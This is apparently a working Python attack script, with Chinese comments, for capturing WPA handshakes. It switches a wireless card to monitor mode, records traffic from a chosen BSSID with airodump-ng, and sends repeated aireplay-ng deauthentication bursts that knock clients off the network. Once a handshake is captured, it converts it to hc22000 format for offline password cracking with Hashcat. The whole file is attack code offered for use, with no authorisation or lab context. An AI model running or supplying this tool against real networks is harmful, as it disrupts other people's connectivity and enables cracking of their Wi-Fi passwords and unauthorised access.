import sys
import time
import subprocess
import os
import re
import signal

# ================= 配置区域 =================
TMP_PREFIX = "/tmp/handshake_capture"
DEAUTH_PACKETS = 10   
CHECK_INTERVAL = 5    
ATTACK_INTERVAL = 15  
# ===========================================

def run_cmd(cmd):
    """执行命令并返回输出"""
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
        return result.stdout.decode(errors='ignore')
    except:
        return ""

def get_monitor_interface():
    # 1. 检查是否已有 Monitor 接口
    iw_output = run_cmd("iwconfig")
    match = re.search(r'(\w+)\s+IEEE 802.11.*Mode:Monitor', iw_output)
    if match: return match.group(1)

    print("[*] 正在准备环境 (airmon-ng check kill)...")
    run_cmd("airmon-ng check kill")

    # 2. 寻找物理接口
    interfaces = os.listdir('/sys/class/net')
    wlan_iface = "wlan0" if "wlan0" in interfaces else next((i for i in interfaces if i.startswith('wl') and not i.endswith('mon')), None)
    
    if not wlan_iface:
        print("[!] 错误: 未找到物理无线网卡")
        return None

    # 3. 启动监听
    print(f"[*] 启动监听模式: airmon-ng start {wlan_iface}")
    run_cmd(f"airmon-ng start {wlan_iface}")
    
    # 4. 再次获取接口名
    iw_output = run_cmd("iwconfig")
    match = re.search(r'(\w+)\s+IEEE 802.11.*Mode:Monitor', iw_output)
    if match: return match.group(1)
    
    return None

def cleanup(proc_list):
    print("[*] 正在清理进程...")
    for p in proc_list:
        if p.poll() is None:
            p.terminate()
    os.system("killall aireplay-ng airodump-ng 2>/dev/null")

def check_handshake(cap_file):
    if not os.path.exists(cap_file): return False
    output = run_cmd(f"aircrack-ng {cap_file}")
    return "handshake" in output

def convert_to_hc22000(cap_file):
    """
    [新增] 尝试将 cap 转换为 hc22000 (用于 Hashcat)
    """
    if run_cmd("which hcxpcapngtool").strip() == "":
        print("[!] 未检测到 hcxpcapngtool，跳过格式转换 (建议安装: apt install hcxtools)")
        return None
    
    hc_file = cap_file.replace(".cap", ".hc22000")
    print(f"[*] 正在转换格式: {cap_file} -> {hc_file}")
    
    # 执行转换
    run_cmd(f"hcxpcapngtool -o {hc_file} {cap_file}")
    
    if os.path.exists(hc_file):
        print(f"[SUCCESS] CONVERTED: {hc_file}")
        return hc_file
    return None

def main():
    if len(sys.argv) < 4:
        print("[!] Usage: python3 handshake_worker.py <BSSID> <Channel> <Timeout> [Interface]")
        sys.exit(1)

    target_bssid = sys.argv[1]
    target_channel = sys.argv[2]
    timeout = int(sys.argv[3])
    
    mon_iface = get_monitor_interface()
    if not mon_iface:
        print("[!] 无法启动监听接口")
        sys.exit(1)
        
    print(f"[*] 监听接口就绪: {mon_iface}")
    print(f"[*] 目标: {target_bssid} (CH {target_channel})")

    os.system(f"rm -f {TMP_PREFIX}*")
    run_cmd(f"iwconfig {mon_iface} channel {target_channel}")

    dump_cmd = [
        "airodump-ng", "-c", target_channel, "--bssid", target_bssid,
        "-w", TMP_PREFIX, "--output-format", "cap", mon_iface
    ]
    
    with open(os.devnull, 'w') as devnull:
        dump_proc = subprocess.Popen(dump_cmd, stdout=devnull, stderr=devnull)

    print("[*] 等待 airodump 启动 (3s)...")
    time.sleep(3)

    start_time = time.time()
    last_attack_time = 0
    captured = False
    
    try:
        while (time.time() - start_time) < timeout:
            current_time = time.time()
            elapsed = int(current_time - start_time)
            
            if (current_time - last_attack_time) >= ATTACK_INTERVAL:
                print(f"[*] ({elapsed}s) 发送 Deauth 广播包...")
                attack_cmd = f"aireplay-ng --deauth {DEAUTH_PACKETS} -a {target_bssid} {mon_iface}"
                subprocess.Popen(attack_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                last_attack_time = current_time
            
            cap_file = f"{TMP_PREFIX}-01.cap"
            if check_handshake(cap_file):
                print("\n[SUCCESS] CAPTURED")
                print(f"[*] 握手包路径: {cap_file}")
                
                # [新增] 尝试转换格式
                convert_to_hc22000(cap_file)
                
                captured = True
                break
            
            time.sleep(CHECK_INTERVAL)
                
    except KeyboardInterrupt:
        pass
    finally:
        cleanup([dump_proc])
    
    if not captured:
        print("\n[FAIL] TIMEOUT")

if __name__ == "__main__":
    main()